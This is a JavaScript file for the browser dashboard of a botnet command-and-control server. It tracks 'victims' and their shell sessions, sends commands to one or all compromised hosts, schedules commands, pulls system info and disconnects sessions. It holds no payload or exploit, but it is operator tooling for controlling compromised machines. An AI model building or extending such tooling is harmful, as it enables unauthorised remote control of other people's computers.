/* ============================================================
   BOTNET C2 — Dashboard JS
   ============================================================ */

'use strict';

// ── State ────────────────────────────────────────────────────
let victims        = [];
let cmdsSent       = 0;
let outputFilter   = 'all';   // 'all' | victim_id string

// ── DOM refs ─────────────────────────────────────────────────
const $ = id => document.getElementById(id);

const elVictimsBody   = $('victims-body');
const elOutput        = $('output');
const elActivityFeed  = $('activity-feed');
const elSchedulesList = $('schedules-list');
const elSysinfoGrid   = $('sysinfo-grid');
const elSysinfoModal  = $('sysinfo-modal');
const elTargetSelect  = $('target-select');
const elSchedTarget   = $('sched-target');
const elOutputFilter  = $('output-filter');
const elCmdInput      = $('cmd-input');
const elSidebar       = $('sidebar');
const elRightPanel    = $('right-panel');
const elBackdrop      = $('drawer-backdrop');
const elSidebarToggle = $('sidebar-toggle');
const elPanelToggle   = $('panel-toggle');

// ── Helpers ──────────────────────────────────────────────────
function esc(str) {
    if (str == null) return '';
    return String(str)
        .replace(/&/g,'&amp;')
        .replace(/</g,'&lt;')
        .replace(/>/g,'&gt;')
        .replace(/"/g,'&quot;')
        .replace(/'/g,'&#39;');
}

function now() {
    const d = new Date();
    return d.toTimeString().slice(0,8);
}

// ── Output console ───────────────────────────────────────────
const EXPAND_THRESHOLD = 120;  // chars — above this or multi-line → collapsible

/**
 * Append a log entry. If msg is multi-line or long, wraps the body in a
 * collapsible <details> so the console stays compact.
 *
 * @param {string} tag     - 'CMD' | 'OK' | 'ERR' | 'SYS'
 * @param {string} prefix  - short label shown in the summary, e.g. '[0] whoami'
 * @param {string} body    - full output text (may be multi-line)
 * @param {string} type    - 'cmd' | 'ok' | 'err' | 'sys'
 * @param {string} session - victim id or 'sys' / 'all'
 */
function appendOutput(tag, prefix, body, type, session) {
    const sid = session || 'sys';
    const line = document.createElement('div');
    line.className = 'log-line';
    line.dataset.session = sid;
    const visible = outputFilter === 'all'
        || sid === outputFilter
        || sid === 'sys'
        || sid === 'all';
    if (!visible) line.classList.add('hidden');

    const isLong = body && (body.includes('\n') || body.length > EXPAND_THRESHOLD);
    const timeSpan  = `<span class="log-time">${esc(now())}</span>`;
    const tagSpan   = `<span class="log-tag tag-${esc(type)}">${esc(tag)}</span>`;

    if (isLong) {
        // First line of output used as the summary preview
        const preview = body.split('\n')[0].slice(0, 80) + (body.length > 80 ? '…' : '');
        line.innerHTML =
            timeSpan + tagSpan +
            `<details class="log-details">
               <summary class="log-summary">${esc(prefix)} <span class="log-preview">${esc(preview)}</span></summary>
               <pre class="log-body">${esc(body)}</pre>
             </details>`;
    } else {
        line.innerHTML =
            timeSpan + tagSpan +
            `<span class="log-msg">${esc(prefix)}${body ? ' ' + esc(body) : ''}</span>`;
    }

    elOutput.appendChild(line);
    elOutput.scrollTop = elOutput.scrollHeight;
}

/** Convenience wrapper for short system/cmd messages with no separate prefix/body split. */
function appendLog(tag, msg, type, session) {
    appendOutput(tag, msg, '', type, session);
}

// ── Output filter ────────────────────────────────────────────
function applyOutputFilter(value) {
    outputFilter = value;
    elOutput.querySelectorAll('.log-line').forEach(line => {
        const sid = line.dataset.session || 'sys';
        // 'all' filter = show everything
        // specific victim filter = show that victim's lines + broadcast ('all') + system ('sys')
        const visible = outputFilter === 'all'
            || sid === outputFilter
            || sid === 'sys'
            || sid === 'all';
        line.classList.toggle('hidden', !visible);
    });
}

// ── Sidebar / drawer toggles ─────────────────────────────────
function isMobile() {
    return window.matchMedia('(max-width: 900px)').matches;
}

function closeDrawers() {
    elSidebar.classList.remove('open');
    elRightPanel.classList.remove('open');
    elBackdrop.classList.remove('active');
    elSidebarToggle.setAttribute('aria-expanded','false');
    elPanelToggle.setAttribute('aria-expanded','false');
}

function toggleSidebar() {
    if (!isMobile()) {
        // Desktop: collapse / expand by width
        const collapsed = elSidebar.classList.toggle('collapsed');
        elSidebarToggle.setAttribute('aria-expanded', collapsed ? 'false' : 'true');
        return;
    }
    const opening = !elSidebar.classList.contains('open');
    closeDrawers();
    if (opening) {
        elSidebar.classList.add('open');
        elBackdrop.classList.add('active');
        elSidebarToggle.setAttribute('aria-expanded','true');
    }
}

function togglePanel() {
    if (!isMobile()) {
        const collapsed = elRightPanel.classList.toggle('collapsed');
        elPanelToggle.setAttribute('aria-expanded', collapsed ? 'false' : 'true');
        return;
    }
    const opening = !elRightPanel.classList.contains('open');
    closeDrawers();
    if (opening) {
        elRightPanel.classList.add('open');
        elBackdrop.classList.add('active');
        elPanelToggle.setAttribute('aria-expanded','true');
    }
}

// ── Victim select population ─────────────────────────────────
function populateSelects(victimList) {
    const selects = [elTargetSelect, elSchedTarget, elOutputFilter];
    selects.forEach(sel => {
        if (!sel) return;
        const currentVal = sel.value;
        // Keep first "All Sessions" option
        while (sel.options.length > 1) sel.remove(1);
        victimList.forEach(v => {
            const opt = document.createElement('option');
            opt.value = v.id;
            opt.textContent = `${v.alias || v.id} (${v.address})`;
            sel.appendChild(opt);
        });
        // Restore selection if still valid
        if ([...sel.options].some(o => o.value === currentVal)) {
            sel.value = currentVal;
        }
    });
}

// ── Refresh victims ───────────────────────────────────────────
async function refreshVictims() {
    try {
        const res  = await fetch('/api/victims');
        const data = await res.json();
        victims = data.victims || [];
        renderVictims(victims);
        populateSelects(victims);
        updateStats(victims);
    } catch(e) {
        // silently ignore network errors during polling
    }
}

function renderVictims(list) {
    if (!list.length) {
        elVictimsBody.innerHTML =
            '<tr><td colspan="7"><div class="empty-state">No sessions yet</div></td></tr>';
        return;
    }
    elVictimsBody.innerHTML = list.map(v => {
        const status = v.connected
            ? (v.in_shell
                ? `<span class="badge badge-shell">SHELL</span>`
                : `<span class="badge badge-connected">ONLINE</span>`)
            : `<span class="badge badge-disconnected">DEAD</span>`;
        return `<tr>
            <td>${esc(v.id)}</td>
            <td>${esc(v.alias || v.id)}</td>
            <td>${esc(v.address)}</td>
            <td>${esc(v.os || '?')}</td>
            <td>${status}</td>
            <td>${esc(v.last_seen || '?')}</td>
            <td>
              <div class="victim-actions">
                <button type="button" class="btn btn-sm tooltip"
                        data-tip="Rename"
                        aria-label="Rename ${esc(v.alias || v.id)}"
                        onclick="renameVictim('${esc(v.id)}')" >Rename</button>
                <button type="button" class="btn btn-sm tooltip"
                        data-tip="System info"
                        aria-label="System info for ${esc(v.alias || v.id)}"
                        onclick="showSysinfo('${esc(v.id)}')">Info</button>
                ${v.connected ? `<button type="button" class="btn btn-sm btn-danger tooltip"
                        data-tip="Kick session"
                        aria-label="Disconnect ${esc(v.alias || v.id)}"
                        onclick="kickVictim('${esc(v.id)}')">Kick</button>` : ''}
              </div>
            </td>
          </tr>`;
    }).join('');
}

function updateStats(list) {
    $('stat-total').textContent     = list.length;
    $('stat-connected').textContent = list.filter(v => v.connected).length;
    $('stat-dead').textContent      = list.filter(v => !v.connected).length;
    $('stat-cmds').textContent      = cmdsSent;
}

// ── Send command ──────────────────────────────────────────────
async function sendCmd() {
    const cmd    = elCmdInput.value.trim();
    const target = elTargetSelect.value;
    if (!cmd) return;

    if (cmd === 'clear') {
        elOutput.innerHTML = '';
        elCmdInput.value = '';
        return;
    }

    appendLog('CMD', `[${target}] ${cmd}`, 'cmd', target);
    elCmdInput.value = '';
    cmdsSent++;
    $('stat-cmds').textContent = cmdsSent;

    try {
        const res  = await fetch('/api/command', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({target, command: cmd})
        });
        const data = await res.json();
        if (data.clear) {
            elOutput.innerHTML = '';
            return;
        }
        if (data.results) {
            data.results.forEach(r => {
                const type   = r.error ? 'err' : 'ok';
                const tag    = r.error ? 'ERR' : 'OK';
                const body   = r.error || r.output || '';
                const prefix = `[${r.id}]`;
                appendOutput(tag, prefix, body, type, r.id);
            });
        } else if (data.error) {
            appendLog('ERR', data.error, 'err', 'sys');
        }
    } catch(e) {
        appendLog('ERR', `Request failed: ${e.message}`, 'err', 'sys');
    }
}

// ── Rename victim ─────────────────────────────────────────────
async function renameVictim(id) {
    const v     = victims.find(x => x.id === id);
    const alias = window.prompt('New alias:', v ? (v.alias || v.id) : id);
    if (!alias) return;
    try {
        await fetch('/api/rename', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({id, alias})
        });
        refreshVictims();
    } catch(e) {
        appendLog('ERR', `Rename failed: ${e.message}`, 'err', 'sys');
    }
}

// ── Clear dead ────────────────────────────────────────────────
async function clearDead() {
    try {
        await fetch('/api/clear', {method:'POST'});
        appendLog('SYS', 'Cleared disconnected sessions', 'sys', 'sys');
        refreshVictims();
    } catch(e) {
        appendLog('ERR', `Clear failed: ${e.message}`, 'err', 'sys');
    }
}

// ── Disconnect (kick) ─────────────────────────────────────────
async function kickVictim(id) {
    if (!confirm(`Disconnect session ${id}?`)) return;
    try {
        const res  = await fetch('/api/disconnect', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({target: id})
        });
        const data = await res.json();
        if (data.error) { appendLog('ERR', data.error, 'err', 'sys'); return; }
        appendLog('SYS', `Session ${id} disconnected`, 'sys', 'sys');
        refreshVictims();
    } catch(e) {
        appendLog('ERR', `Kick failed: ${e.message}`, 'err', 'sys');
    }
}

async function kickAll() {
    const connected = victims.filter(v => v.connected);
    if (!connected.length) { appendLog('SYS', 'No connected sessions to kick', 'sys', 'sys'); return; }
    if (!confirm(`Disconnect all ${connected.length} connected session(s)?`)) return;
    try {
        const res  = await fetch('/api/disconnect', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({target: 'all'})
        });
        const data = await res.json();
        appendLog('SYS', `Kicked ${(data.kicked||[]).length} session(s)`, 'sys', 'sys');
        refreshVictims();
    } catch(e) {
        appendLog('ERR', `Kick all failed: ${e.message}`, 'err', 'sys');
    }
}

// ── Sysinfo modal ─────────────────────────────────────────────
async function showSysinfo(id) {
    elSysinfoGrid.innerHTML = '<div class="empty-state">Loading...</div>';
    openModal();
    try {
        const res  = await fetch(`/api/sysinfo/${encodeURIComponent(id)}`);
        const data = await res.json();
        if (data.error) {
            elSysinfoGrid.innerHTML = `<div class="empty-state">${esc(data.error)}</div>`;
            return;
        }
        elSysinfoGrid.innerHTML = Object.entries(data).map(([k,v]) =>
            `<div class="sysinfo-item">
               <div class="sysinfo-key">${esc(k)}</div>
               <div class="sysinfo-val">${esc(v)}</div>
             </div>`
        ).join('');
    } catch(e) {
        elSysinfoGrid.innerHTML = `<div class="empty-state">Error: ${esc(e.message)}</div>`;
    }
}

function openModal() {
    elSysinfoModal.classList.add('active');
    elSysinfoModal.setAttribute('aria-hidden','false');
    $('modal-close-btn').focus();
}

function closeModal() {
    elSysinfoModal.classList.remove('active');
    elSysinfoModal.setAttribute('aria-hidden','true');
}

// ── Activity feed ─────────────────────────────────────────────
async function refreshActivity() {
    try {
        const res  = await fetch('/api/activity');
        const data = await res.json();
        const items = data.activity || [];
        if (!items.length) {
            elActivityFeed.innerHTML = '<div class="empty-state">No activity yet</div>';
            return;
        }
        elActivityFeed.innerHTML = '';
        items.slice().reverse().forEach(item => {
            const div = document.createElement('div');
            div.className = 'activity-item';
            div.innerHTML =
                `<div class="activity-body">` +
                  `<div class="activity-action">${esc(item.action)}</div>` +
                  (item.detail ? `<div class="activity-detail">${esc(item.detail)}</div>` : '') +
                `</div>` +
                `<span class="activity-time">${esc(item.time || '')}</span>`;
            elActivityFeed.appendChild(div);
        });
    } catch(e) {
        // ignore
    }
}

// ── Schedules ─────────────────────────────────────────────────
async function refreshSchedules() {
    try {
        const res  = await fetch('/api/schedules');
        const data = await res.json();
        const list = data.schedules || [];
        if (!list.length) {
            elSchedulesList.innerHTML = '<div class="empty-state">No schedules</div>';
            return;
        }
        elSchedulesList.innerHTML = list.map(s =>
            `<div class="schedule-item">
               <div class="schedule-time">${esc(s.time)}</div>
               <div class="schedule-cmd">${esc(s.command)}</div>
               <div class="schedule-target">Target: ${esc(s.target)}</div>
             </div>`
        ).join('');
    } catch(e) {
        // ignore
    }
}

async function addSchedule(e) {
    e.preventDefault();
    const time    = $('sched-time').value.trim();
    const target  = $('sched-target').value;
    const command = $('sched-cmd').value.trim();
    if (!time || !command) return;
    try {
        await fetch('/api/schedule', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({time, target, command})
        });
        $('sched-time').value = '';
        $('sched-cmd').value  = '';
        appendLog('SYS', `Scheduled "${command}" at ${time} for ${target}`, 'sys', 'sys');
        refreshSchedules();
    } catch(e2) {
        appendLog('ERR', `Schedule failed: ${e2.message}`, 'err', 'sys');
    }
}

// ── Panel tabs ────────────────────────────────────────────────
function switchTab(tabId) {
    document.querySelectorAll('.panel-tab').forEach(t => {
        const active = t.id === tabId;
        t.classList.toggle('active', active);
        t.setAttribute('aria-selected', active ? 'true' : 'false');
    });
    document.querySelectorAll('.panel-page').forEach(p => {
        p.classList.toggle('active', p.getAttribute('aria-labelledby') === tabId);
    });
}

// ── Refresh all ───────────────────────────────────────────────
function refreshAll() {
    refreshVictims();
    refreshActivity();
    refreshSchedules();
}

// ── Event listeners ───────────────────────────────────────────
$('btn-execute').addEventListener('click', sendCmd);
$('btn-refresh').addEventListener('click', refreshAll);
$('btn-clear-dead').addEventListener('click', clearDead);
$('btn-kick-all').addEventListener('click', kickAll);
$('btn-clear-output').addEventListener('click', () => { elOutput.innerHTML = ''; });
$('modal-close-btn').addEventListener('click', closeModal);
$('tab-activity').addEventListener('click',  () => switchTab('tab-activity'));
$('tab-schedules').addEventListener('click', () => switchTab('tab-schedules'));
$('schedule-form').addEventListener('submit', addSchedule);

elSidebarToggle.addEventListener('click', toggleSidebar);
elPanelToggle.addEventListener('click',   togglePanel);
elBackdrop.addEventListener('click',      closeDrawers);

elCmdInput.addEventListener('keydown', e => {
    if (e.key === 'Enter') sendCmd();
});

elOutputFilter.addEventListener('change', e => {
    applyOutputFilter(e.target.value);
});

elSysinfoModal.addEventListener('click', e => {
    if (e.target === elSysinfoModal) closeModal();
});

// ── Keyboard shortcuts ────────────────────────────────────────
document.addEventListener('keydown', e => {
    // Ctrl+K / Cmd+K — focus command input
    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
        e.preventDefault();
        elCmdInput.focus();
        elCmdInput.select();
    }
    // Escape — close modal or drawers
    if (e.key === 'Escape') {
        if (elSysinfoModal.classList.contains('active')) {
            closeModal();
        } else {
            closeDrawers();
        }
    }
    // [ — toggle left sidebar (desktop)
    if (e.key === '[' && !e.ctrlKey && !e.metaKey && e.target.tagName !== 'INPUT') {
        toggleSidebar();
    }
    // ] — toggle right panel (desktop)
    if (e.key === ']' && !e.ctrlKey && !e.metaKey && e.target.tagName !== 'INPUT') {
        togglePanel();
    }
});

// ── Cmd buttons (sidebar) ─────────────────────────────────────
document.querySelectorAll('.cmd-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const cmd = btn.dataset.cmd;
        if (!cmd) return;
        elCmdInput.value = cmd;
        elCmdInput.focus();
        // Close drawer on mobile after selecting
        if (isMobile()) closeDrawers();
    });
});

// ── Init ──────────────────────────────────────────────────────
appendLog('SYS', 'Dashboard connected', 'sys', 'sys');
refreshAll();
setInterval(refreshAll, 4000);
